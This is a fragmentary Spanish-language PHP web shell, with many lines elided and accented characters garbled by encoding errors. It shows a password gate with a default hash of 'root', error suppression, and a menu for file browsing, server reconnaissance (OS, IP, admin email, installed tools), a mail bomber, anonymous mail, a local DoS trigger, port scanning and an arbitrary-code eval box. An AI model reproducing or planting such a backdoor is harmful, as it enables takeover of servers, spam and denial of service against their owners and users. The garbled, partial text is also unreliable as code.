...
@session_start();
error_reporting(0);
$password = "63a9f0ea7bb98050796b649e85481845"; //contrase馻 md5, por defecto: 'root'
...
$_SESSION["login"] = 'ok';
 ...
 echo '<div style="text-align: left;"><form method="POST" action=""><span>Contrase馻: </span><input type="password" name="pass"><input type="submit" VALUE="Entrar"></form>'; 
return 0;
}
exec('wget --help',$wget);
if ($wget) {
...
</style> </head><body style="background-color: black; color: rgb(0, 0, 0);" alink="#ee0000" link="#0000ee" vlink="#551a8b"><div style="text-align: center; background-color: rgb(7, 7, 7);"><big><a href="?"><big><big style="font-family: Aharoni;"><big><span style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000">'.$nombre_princi.'</span></big></big></big></a><br></big><hr style="width: 100%; height: 2px;"><big style="color: white;"><a style="color: white;" href="?">Archivos</a> | <a style="color: white;" href="?opcion=info_sistema">Informaci髇 del sistema</a></big><span style="color: white;"> | <a style="color: white;" href="?opcion=mail">Mail</a> | <a style="color: white;" href="?opcion=dos">DOS</a> | <a style="color: white;" href="?opcion=escaner_puertos">Escanear puertos</a> | <a style="color: white;" href="?opcion=eval">Eval</a> | <a style="color: white;" href="?opcion=encode_decode">Encode/Decode</a> | <a style="color: white;" href="?opcion=salir">Salir</a></span><hr style="width: 100%; height: 2px;"><br><table style="width: 966px; height: 201px; text-align: left; margin-left: auto; margin-right: auto;" border="1" cellpadding="2" cellspacing="2">  <tbody>   <tr><td><span style="color: rgb(167, 167, 167);">';
if (isset($_GET['leer'])) {
...
echo '<div style="text-align: center;"><big><big style="color: white;">Informaci髇 del sistema</big></big><div style="text-align: left;"><br/><b>&nbsp;&nbsp;<a style="color: white;" href="?opcion=php_info">PHP info</a><span style="color: white;"></b></span><br/><b>&nbsp;&nbsp;Sistema operativo:</b> '.php_uname().'<br/> <b>&nbsp;&nbsp;Servidor:</b> '.$_SERVER['SERVER_SOFTWARE'].'<br/><b>&nbsp;&nbsp;Versi髇 PHP:</b> '.PHP_VERSION.'<br/><b>&nbsp;&nbsp;Espacio:</b> '.tama駉(diskfreespace(getcwd())).'/'.tama駉(disk_total_space(getcwd())).'<br/><b>&nbsp;&nbsp;Nombre del servidor:</b> '.$_SERVER['HTTP_HOST'].'<br/><b>&nbsp;&nbsp;IP:</b> '.$_SERVER['SERVER_ADDR'].'<br/><b>&nbsp;&nbsp;E-mail admin:</b> '.$_SERVER['SERVER_ADMIN'].'<br/><b>&nbsp;&nbsp;Safe Mode:</b> '.$safe.'<br/> <b>&nbsp;&nbsp;cURL:</b> '.(($curl_on)?('Activado'):('Desactivado')).'<br/><b>&nbsp;&nbsp;Perl:</b> '.$perle.'.<br/><b>&nbsp;&nbsp;Magic quotes:</b> '.$magic.'.<br/><b>&nbsp;&nbsp;WGET:</b> '.$wgete.'.<br/><b>&nbsp;&nbsp;Bases de datos activas: </b>'.$base.'<br/>';
...
echo '<div style="text-align: center;"><big><big style="color: white;">Mail</big></big><br><br><br><br> <big><a style="color: white;" href="?opcion=mail_bomber">Mail bomber</a></big> |<big> <a style="color: white;"href="?opcion=mail_anonimo">Mail an髇imo</a></big>';
} elseif ($opcion == 'ddos') {
...
fclose($fp);
 ...
 echo '<div style="text-align: center;"><big><big style="color: white;">Dos local</big></big><br><br><br><br>Si pulsas el bot髇 de abajo puede que el servidor se lagee, caiga o no ocurra nada (depende de la seguridad del mismo), 縠st醩 seguro?<br/><br/><a style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000" href="?opcion=tirar" target="_blank">  　Tirar!!  </a>
';
...
?>
 ...
 style="color: white;">Mail an髇imo</big></big><div style="text-align: left;">
...
echo "<div style='text-align: center;'><big><big style='color: white;'>Eval</big></big><br/><br/><form action='' method=POST><b>C骴igo:</b><br/> <textarea  cols='47' rows='4' name=codigo style='color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000'>echo 'Lifka';";
...
echo '<div style="text-align: center;"><big><big style="color: white;">Gesti髇 de archivos</big></big><div style="text-align: left;"><br/> &nbsp;&nbsp;<b>Shell:</b> '.$shelldir.'<br/>&nbsp;&nbsp;<b>Home:</b>'.$homedir.'/<br/>&nbsp;&nbsp;<b>Actual:</b>'.$dir.'<br/>';
$dir = opendir($path);
